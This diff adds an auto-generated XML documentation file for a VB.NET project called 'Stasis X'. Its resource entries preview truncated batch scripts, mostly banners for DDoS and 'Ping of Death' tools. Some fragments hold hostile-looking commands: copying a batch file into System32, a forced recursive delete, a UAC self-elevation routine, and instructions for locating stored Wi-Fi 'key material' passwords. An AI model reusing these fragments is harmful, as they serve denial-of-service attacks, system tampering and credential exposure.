@@ -1,0 +1,208 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Stasis X
+</name>
+</assembly>
+<members>
+<member name="T:Stasis_X.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources._608c6f7550ad1349150556">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Badb">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Badb1">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Cleanse">
+<summary>
+  Looks up a localized string similar to @echo off
+:menu
+color 1F
+
+ECHO     _____   _____    ____            _____    _____  _______       
+ECHO    ^ \    ^\  ^|       ^|      ^|     ^|  ^|     \     ^|       ^|      \   /
+ECHO     ^ \      ^|_____  ^|      ^|     ^|  ^|_____^|     ^|       ^|       \ /
+ECHO      ^ \     ^|       ^|      ^|     ^|  ^|     \     ^|       ^|        ^|
+ECHO   ^\____\    ^|_____  ^|____  ^|_____^|  ^|      \  __^|__     ^|        ^|
+ECHO .................................
+ECHO . PRESS 1, 2, 3, 4 or 5 to EXIT  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.exit_logo_300x169">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.has">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.has1">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.krom">
+<summary>
+  Looks up a localized string similar to @echo off 
+mode 2000
+color 04
+echo server adderss. 
+echo u can run a ping with google.
+echo rout multiple network.
+echo ur all password is transfered to ur file manager u can get it by following the steps.
+echo u should do this after launching the process.
+echo go to the file c:\ directory.
+echo open the file. 
+echo go to the discription (xml file ).
+echo search for key meterial and that&apos;s ur password. 
+echo note ur all password is loaded in it whic is secured in ur pc.
+echo this even includes  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Morrayne">
+<summary>
+  Looks up a localized string similar to mode CON: cols=89 LINES=22
+title DDoS - By Batcher                                                                                                          V.3.4
+
+set &quot;DIR=C:\Users\%username%\AppData\Local\Temp\DDoS&quot;
+
+if exist %DIR% goto skipmd
+md %DIR%
+
+:skipmd
+cd %DIR%
+goto init
+
+:start
+set &quot;o= &quot;
+DEL /F /Q /S *.bat *.dat
+color a
+@echo off
+cls
+echo.
+echo   ÛÛÛÛÛÛ» ÛÛÛÛÛÛ»  ÛÛÛÛÛÛ» ÛÛÛÛÛÛÛ»    ÛÛÛÛÛÛ» ÛÛ»  ÛÛ»
+echo   ÛÛÉÍÍÛÛ»ÛÛÉÍÍÛÛ»ÛÛÉÍÍÍÛÛ»ÛÛÉÍÍÍÍ¼    ÈÍÍÍÍÛÛ»ÛÛº  ÛÛº
+echo   ÛÛº  ÛÛºÛ [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Network">
+<summary>
+  Looks up a localized string similar to @ECHO OFF
+setlocal EnableDelayedExpansion
+
+NET FILE 1&gt;NUL 2&gt;NUL
+if &apos;%errorlevel%&apos; == &apos;0&apos; ( goto START ) else ( goto getPrivileges ) 
+
+:getPrivileges
+if &apos;%1&apos;==&apos;ELEV&apos; ( goto START )
+
+set &quot;batchPath=%~f0&quot;
+set &quot;batchArgs=ELEV&quot;
+
+::Add quotes to the batch path, if needed
+set &quot;script=%0&quot;
+set script=%script:&quot;=%
+IF &apos;%0&apos;==&apos;!script!&apos; ( GOTO PathQuotesDone )
+    set &quot;batchPath=&quot;&quot;%batchPath%&quot;&quot;&quot;
+:PathQuotesDone
+
+::Add quotes to the arguments, if needed.
+:ArgLoop
+IF &apos;%1&apos;==&apos;&apos; ( GOTO EndArgLoop ) else ( [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Radon">
+<summary>
+  Looks up a localized string similar to @echo off
+title Ping 0f Death
+color a
+copy E:\Utilities\Dll.bat C:\Windows\System32
+:a 
+cls
+echo +=================================+
+echo #                                 #
+echo #     AD ~ Ping 0f Death Tool     #
+echo #                                 #
+echo +=================================+
+echo.
+echo Copyright (c) by AD h4Ck3R
+echo Version 1.7
+echo Web - http://adhacker.96.lt
+echo.
+echo  System Info
+echo -------------
+echo.
+echo Operating System : %os%
+echo PC Name : %computername% [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Rane">
+<summary>
+  Looks up a localized string similar to @echo off
+mode 117,28
+title   .                                                                                                                             +  MythycDDoS  + .
+cls
+color f
+echo.
+set hrs=%time:~0,2%
+set mns=%time:~3,2%
+set scs=%time:~6,2%
+set mls=%time:~9,2%
+set nmt=%time:~0,8%
+echo.
+
+Call :Color 04 &quot;    888b     d888          888    888                        8888888b.  8888888b.            .d8888b.  &quot;
+echo.
+Call :Color 04 &quot;    8888b   d8888          888    888                  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Stasis_X.My.Resources.Resources.Utility">
+<summary>
+  Looks up a localized string similar to @Echo off
+//created and designed by MOHIT MALHOTRA
+
+cls
+
+:menu
+color a
+cls
+echo.
+echo ______________________________WINDOW UTILITIES____________________________
+echo.
+echo.
+echo 1) Delete the TEMPORARY CACHE (faltu) in the system
+echo 2) Activate the ON SCREEN KEYBOARD
+echo 3) Show all the directories in the system with related information
+echo 4) Kill any process (ex. type notepad.exe for txt files)
+echo 5) show all the hidden files in an external directory (except C: drive)
+echo 6) Open t [rest of string was truncated]&quot;;.
+</summary>
+</member>
+</members>
+</doc>
